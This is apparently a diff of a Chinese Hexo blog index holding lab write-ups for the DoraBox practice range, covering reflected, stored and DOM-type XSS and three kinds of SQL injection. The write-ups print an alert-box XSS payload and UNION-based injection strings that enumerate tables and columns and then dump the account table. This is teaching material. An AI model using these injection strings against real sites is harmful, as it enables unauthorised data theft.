+<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对存储型XSS是这样定义的：</p>
+<p>持久型跨站脚本（Presistent Cross-site Scripting）也等于<a href="https://blog.csdn.net/weixin_44720762/article/details/89736508" target="_blank" rel="noopener">存储型跨站脚本（Stored Cross-site Scripting）</a>，比反射型跨站脚本更具有威胁性，并且可能影响到Web服务器的安全。持久型XSS一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在网页中，即在受害者主机上的浏览器执行恶意代码。</p>
+<h2 id="构造攻击-1"><a href="#构造攻击-1" class="headerlink" title="构造攻击"></a>构造攻击</h2><p>同之前一样，我们先构造一个XSS的payload的提交上去</p>
+<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg11.PNG" title="timg">
+
+<p>触发弹窗，payload执行成功，观察URL这次没有name参数了。</p>
+<p>但是当我们点击确定的时候，弹窗重新出现。尝试刷新，弹窗依旧没有消失。而这，就是存可以执行多次的储型XSS，它将payload存储在了页面中，导致每次打开页面时都会执行一次payload。</p>
+<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg11.PNG" title="timg">
+
+<p>我们观察一下前端源码可以发现，每次执行的payload都保留在了网页中</p>
+<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg22.PNG" title="timg">
+
+<p>不难发现这就是存储型XSS的特点，将恶意代码长时间留存，每次打开网页都会造成一次攻击，威力远超一次性的反射型XSS</p>
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>本次漏洞实践，充分表现了反射型XSS和存储型XSS的区别，更加深刻的了解了XSS</p>
+<h1 id="DoraBox-XSS-DOM型"><a href="#DoraBox-XSS-DOM型" class="headerlink" title="DoraBox_XSS DOM型"></a>DoraBox_XSS DOM型</h1><h2 id="什么是DOM型XSS"><a href="#什么是DOM型XSS" class="headerlink" title="什么是DOM型XSS"></a>什么是DOM型XSS</h2><p>个人认为，如果将XSS分为两类，那么反射型XSS和存储型XSS是第一类，DOM型XSS是第二类。DOM型XSS区别于前两类的在于，DOM型XSS是基于<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/1033822?fr=aladdin&fromtitle=DOM&fromid=50288" target="_blank" rel="noopener">DOM文档对象</a>的一种漏洞，它不依赖于服务器的数据，而是从客户端获得DOM中的数据并在本地执行。</p>
+<!--more-->
+
+<h2 id="构造攻击-2"><a href="#构造攻击-2" class="headerlink" title="构造攻击"></a>构造攻击</h2><p>同样的，先构造payload尝试</p>
+<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg111.PNG" title="timg">
 
 <p>成功，URL中也出现了payload，返回结果和反射型XSS是一样的，那么两者的区别体现在哪？</p>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先观察一下反射型XSS的前端源码</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先观察一下反射型XSS的前端源码</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;title&gt;DoraBox - 反射XSS&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">    	&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">    		name: </span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"name"</span> id=<span class="string">"form1"</span>&gt;</span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">&lt;hr&gt; </span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>get方式的提交</p>
@@ -550,179 +766,31 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
 
 <p>从DOM型XSS的前端源码中可以观察出，主要实现是通过window.location.search获取name参数，再通过document.write()在页面上返回获取到的name</p>
 <p>印证了前文所述（从客户端获得DOM中的数据并在本地执行）</p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>DOM型XSS同反射型XSS与存储型XSS区别于恶意代码的执行源，非传统型的XSS。</p>
+<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>DOM型XSS同反射型XSS与存储型XSS区别于恶意代码的执行源，非传统型的XSS。</p>
 ]]></content>
       <categories>
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
+        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
-    <title>存储型XSS靶场探究</title>
-    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-XSS-存储型"><a href="#DoraBox-XSS-存储型" class="headerlink" title="DoraBox_XSS 存储型"></a>DoraBox_XSS 存储型</h1><h4 id="什么是存储型XSS"><a href="#什么是存储型XSS" class="headerlink" title="什么是存储型XSS"></a>什么是存储型XSS</h4><p>我个人对存储型XSS的理解，反射型XSS即时执行一次，而存储型XSS在满足触发条件后执行，就像埋了个地雷。</p>
-<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对存储型XSS是这样定义的：</p>
-<p>持久型跨站脚本（Presistent Cross-site Scripting）也等于<a href="https://blog.csdn.net/weixin_44720762/article/details/89736508" target="_blank" rel="noopener">存储型跨站脚本（Stored Cross-site Scripting）</a>，比反射型跨站脚本更具有威胁性，并且可能影响到Web服务器的安全。持久型XSS一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在网页中，即在受害者主机上的浏览器执行恶意代码。</p>
-<a id="more"></a>
-
-<h4 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h4><p>同之前一样，我们先构造一个XSS的payload的提交上去</p>
-<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（二）/timg1.PNG" title="timg">
-
-<p>触发弹窗，payload执行成功，观察URL这次没有name参数了。</p>
-<p>但是当我们点击确定的时候，弹窗重新出现。尝试刷新，弹窗依旧没有消失。而这，就是存可以执行多次的储型XSS，它将payload存储在了页面中，导致每次打开页面时都会执行一次payload。</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（二）/timg1.PNG" title="timg">
-
-<p>我们观察一下前端源码可以发现，每次执行的payload都保留在了网页中</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（二）/timg2.PNG" title="timg">
-
-<p>不难发现这就是存储型XSS的特点，将恶意代码长时间留存，每次打开网页都会造成一次攻击，威力远超一次性的反射型XSS</p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本次漏洞实践，充分表现了反射型XSS和存储型XSS的区别，更加深刻的了解了XSS</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反射型XSS靶场探究</title>
-    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%80%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-XSS-反射型"><a href="#DoraBox-XSS-反射型" class="headerlink" title="DoraBox_XSS 反射型"></a>DoraBox_XSS 反射型</h1><h4 id="什么是反射型XSS"><a href="#什么是反射型XSS" class="headerlink" title="什么是反射型XSS"></a>什么是反射型XSS</h4><p>作为DoraBox第一次的XSS漏洞练习，先看一下什么是XSS：</p>
-<p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin" target="_blank" rel="noopener">XSS(Cross-site Scripting)</a>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序(来源百度百科)</p>
-<p>我所理解的反射型XSS是XSS的一种， 是即时性XSS。在满足条件时，即时触发，下一次需要再次部署payload</p>
-<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对反射型XSS是这样定义的：</p>
-<p><a href="http://www.ttlsa.com/safe/xss-description/" target="_blank" rel="noopener">反射型跨站脚本（Reflected Cross-site Scripting）</a>也称非持久型，参数型跨站脚本。这类跨站脚本是做常见的，主要是将恶意脚本附加到URL地址参数中。反射型XSS的利用一般是攻击者通过特殊的手法（比如利用电子邮件），诱使用户点击这些特定链接时，恶意的JavaScript代码会直接在受害者主机上执行。他的特点是指在用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。</p>
-<a id="more"></a>
-
-<h4 id="观察环境"><a href="#观察环境" class="headerlink" title="观察环境"></a>观察环境</h4><p>进入XSS环境，根据先前对反射型XSS的描述（将恶意脚本附加到URL地址参数），这提醒我们可以先观察URL是否满足条件。</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg2.PNG" title="timg">
-
-<p>可以看见，红色箭头指向的地方，在URL中出现了submit提交的name参数(红色箭头指向)</p>
-<h4 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h4><p>构造payload提交 ，此payload的效果是弹窗</p>
-<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg1.PNG" title="timg">
-
-<p>执行成功，同时可以看见URL中 name参数 变成了我们的payload。当我们对弹框点击确定后，XSS消失。观察前端源码可以发现我们的payload</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg4.PNG" title="timg">
-
-<p>不难理解，反射型XSS就是通过提交恶意代码让浏览器执行一次，从而达到我们需要的目的。</p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>在2019年OWASP Top10中，XSS位列第三，可见XSS在Web安全漏洞中的重要地位。</p>
-<p>小插曲：我被自己XSS了！</p>
-<p>前文写到的payload，因为要在本地localhost刷新，看完最终效果后我才会上传文章<br>，就在刚才写完准备检查一遍的时候，我惊了。</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg3.PNG" title="timg">
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搜索型_SQL注入（三）</title>
-    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-SQLi搜索型"><a href="#DoraBox-SQLi搜索型" class="headerlink" title="DoraBox_SQLi搜索型"></a>DoraBox_SQLi搜索型</h1><h4 id="进入页面，先submit看一下SQL语句"><a href="#进入页面，先submit看一下SQL语句" class="headerlink" title="进入页面，先submit看一下SQL语句"></a>进入页面，先submit看一下SQL语句</h4><img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg1.PNG" title="timg">
-
-<p>可以发现，需要闭合 % 和 ‘</p>
-<a id="more"></a>
-
-<h4 id="构造闭合和显示位"><a href="#构造闭合和显示位" class="headerlink" title="构造闭合和显示位"></a>构造闭合和显示位</h4><p>DoraBox%’ and 1=2 union select 1,2,3#</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg2.PNG" title="timg">
-
-<h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p>DoraBox%’ and 1=2 union select 1,2,database()#</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg3.PNG" title="timg">
-
-<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>DoraBox%’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg4.PNG" title="timg">
-
-<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>DoraBox%’ and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg5.PNG" title="timg">
-
-<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><p>DoraBox%’ and 1=2 union select 1,2,concat_ws(‘/‘,id,rest,own) from account#</p>
-<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg7.PNG" title="timg">
-
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>自此DoraBox的SQL注入部分全部完成，都是基础操作</p>
-<p>SQLi数字型不用闭合，需要传入ID</p>
-<p>SQLi字符型需要闭合 ‘</p>
-<p>SQLi搜索型需要闭合 % 和 ‘</p>
-<p>可见，在进行SQL注入时，要通过错误返回发现SQL执行语句或者大胆猜测SQL执行语句，才能构造完美闭合，达到最终目的。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>字符型_SQL注入（二）</title>
-    <url>/2019/11/03/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-SQLi字符型"><a href="#DoraBox-SQLi字符型" class="headerlink" title="DoraBox_SQLi字符型"></a>DoraBox_SQLi字符型</h1><h4 id="进入页面，先submit看一下"><a href="#进入页面，先submit看一下" class="headerlink" title="进入页面，先submit看一下"></a>进入页面，先submit看一下</h4><img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg1.PNG" title="timg">
-
-<p>这里可以看见SQL语句：SELECT * FROM news WHERE title=’DoraBox’</p>
-<a id="more"></a>
-
-<p>猜测需要闭合单引号。用 and 1=1 验证</p>
-<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg2.PNG" title="timg">
-
-<p>猜测正确，可以继续。</p>
-<p>之后大致过程与数字型一样，只要注意最后单引号的闭合即可，或者可以用#注释</p>
-<h4 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,database(),user()#</p>
-<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg3.PNG" title="timg">
-
-<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’pentest’#</p>
-<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg4.PNG" title="timg">
-
-<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
-<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg5.PNG" title="timg">
-
-<h4 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,2,concat_ws(‘/‘,id,rest,own) from account #</p>
-<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg6.PNG" title="timg">
-
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>同数字型方式大致相同，注意单引号闭合即可</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数字型_SQL注入（一）</title>
+    <title>SQL注入_DoraBox靶场</title>
     <url>/2019/11/02/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0_SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-SQLi数字型"><a href="#DoraBox-SQLi数字型" class="headerlink" title="DoraBox_SQLi数字型"></a>DoraBox_SQLi数字型</h1><h4 id="进入SQLi数字型的注入页面"><a href="#进入SQLi数字型的注入页面" class="headerlink" title="进入SQLi数字型的注入页面"></a>进入SQLi数字型的注入页面</h4><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG" title="timg">
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现，</p>
+<p>这里使用DoraBox探究基本的三个SQL注入漏洞。</p>
+<a id="more"></a>
+
+<h1 id="DoraBox-SQLi数字型"><a href="#DoraBox-SQLi数字型" class="headerlink" title="DoraBox_SQLi数字型"></a>DoraBox_SQLi数字型</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="进入SQLi数字型的注入页面"><a href="#进入SQLi数字型的注入页面" class="headerlink" title="进入SQLi数字型的注入页面"></a>进入SQLi数字型的注入页面</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG" title="timg">
 
 <p>很简单的页面</p>
-<a id="more"></a>
+<!--more-->
 
-<h4 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h4><p>先点击submit看结果，这里显示出了SQL执行语句 如下</p>
+<h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p>先点击submit看结果，这里显示出了SQL执行语句 如下</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg2.PNG" title="timg">
 
 <p>好接下来 传入id 并观察页面返回 页面返回正常 如下</p>
@@ -733,37 +801,81 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
 <p>1 and 1=2</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg4.PNG" title="timg">
 
-<h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p>1 order by 3 返回正常 1 order by 4 返回错误 所以前者正确</p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>1 order by 3 返回正常 1 order by 4 返回错误 所以前者正确</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg5.PNG" title="timg">
 
-<h4 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h4><p>-1 union select 1,database(),user()</p>
+<h3 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h3><p>-1 union select 1,database(),user()</p>
 <p>可以看见 库名为 pentest 用户为 root@localhost</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg6.PNG" title="timg">
 
-<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
 <p>可以看见有两张表 account 和 news</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg7.PNG" title="timg">
 
-<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’</p>
+<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’</p>
 <p>可以看见三个列名 id rest own</p>
 <img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg8.PNG" title="timg">
 
-<h4 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h4><p>-1 union select 1,2,concat_ws(‘|’,id,rest,own) from account</p>
+<h3 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h3><p>-1 union select 1,2,concat_ws(‘|’,id,rest,own) from account</p>
 <p>可以看见各列内容 至此本次练习结束</p>
-<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG" title="timg">
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG">
 
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>DoraBox漏洞练习平台，难度不高，覆盖面广，包含多种常见Web漏洞环境，作为基础练习能很快上手。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DoraBox漏洞练习平台，难度不高，覆盖面广，包含多种常见Web漏洞环境，作为基础练习能很快上手。</p>
 <p>本次练习为DoraBox漏洞练习平台中非常基础的SQli数字型注入</p>
 <p>DoraBox项目地址：<a href="https://github.com/gh0stkey/DoraBox">https://github.com/gh0stkey/DoraBox</a></p>
+<h1 id="DoraBox-SQLi字符型"><a href="#DoraBox-SQLi字符型" class="headerlink" title="DoraBox_SQLi字符型"></a>DoraBox_SQLi字符型</h1><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><h3 id="进入页面，先submit看一下"><a href="#进入页面，先submit看一下" class="headerlink" title="进入页面，先submit看一下"></a>进入页面，先submit看一下</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg11.PNG" title="timg">
+
+<p>这里可以看见SQL语句：SELECT * FROM news WHERE title=’DoraBox’</p>
+<p>猜测需要闭合单引号。用 and 1=1 验证</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg22.PNG" title="timg">
+
+<p>猜测正确，可以继续。</p>
+<p>之后大致过程与数字型一样，只要注意最后单引号的闭合即可，或者可以用#注释</p>
+<h3 id="爆库名，用户-1"><a href="#爆库名，用户-1" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,database(),user()#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg33.PNG" title="timg">
+
+<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’pentest’#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg44.PNG" title="timg">
+
+<h3 id="爆列名-1"><a href="#爆列名-1" class="headerlink" title="爆列名"></a>爆列名</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg55.PNG" title="timg">
+
+<h3 id="爆内容-1"><a href="#爆内容-1" class="headerlink" title="爆内容"></a>爆内容</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,concat_ws(‘/‘,id,rest,own) from account #</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg66.PNG" title="timg">
+
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>同数字型方式大致相同，注意单引号闭合即可</p>
+<h1 id="DoraBox-SQLi搜索型"><a href="#DoraBox-SQLi搜索型" class="headerlink" title="DoraBox_SQLi搜索型"></a>DoraBox_SQLi搜索型</h1><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><h3 id="进入页面，先submit看一下SQL语句"><a href="#进入页面，先submit看一下SQL语句" class="headerlink" title="进入页面，先submit看一下SQL语句"></a>进入页面，先submit看一下SQL语句</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg111.PNG" title="timg">
+
+<p>可以发现，需要闭合 % 和 ‘</p>
+<h3 id="构造闭合和显示位"><a href="#构造闭合和显示位" class="headerlink" title="构造闭合和显示位"></a>构造闭合和显示位</h3><p>DoraBox%’ and 1=2 union select 1,2,3#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg222.PNG" title="timg">
+
+<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>DoraBox%’ and 1=2 union select 1,2,database()#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg333.PNG" title="timg">
+
+<h3 id="爆表名-2"><a href="#爆表名-2" class="headerlink" title="爆表名"></a>爆表名</h3><p>DoraBox%’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg444.PNG" title="timg">
+
+<h3 id="爆列名-2"><a href="#爆列名-2" class="headerlink" title="爆列名"></a>爆列名</h3><p>DoraBox%’ and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg555.PNG" title="timg">
+
+<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p>DoraBox%’ and 1=2 union select 1,2,concat_ws(‘/‘,id,rest,own) from account#</p>
+<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg777.PNG" title="timg">
+
+<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>自此DoraBox的SQL注入部分全部完成，都是基础操作</p>
+<p>SQLi数字型不用闭合，需要传入ID</p>
+<p>SQLi字符型需要闭合 ‘</p>
+<p>SQLi搜索型需要闭合 % 和 ‘</p>
+<p>可见，在进行SQL注入时，要通过错误返回发现SQL执行语句或者大胆猜测SQL执行语句，才能构造完美闭合，达到最终目的。</p>
 ]]></content>
       <categories>
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1046,9 +1158,9 @@ myqr.run(
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
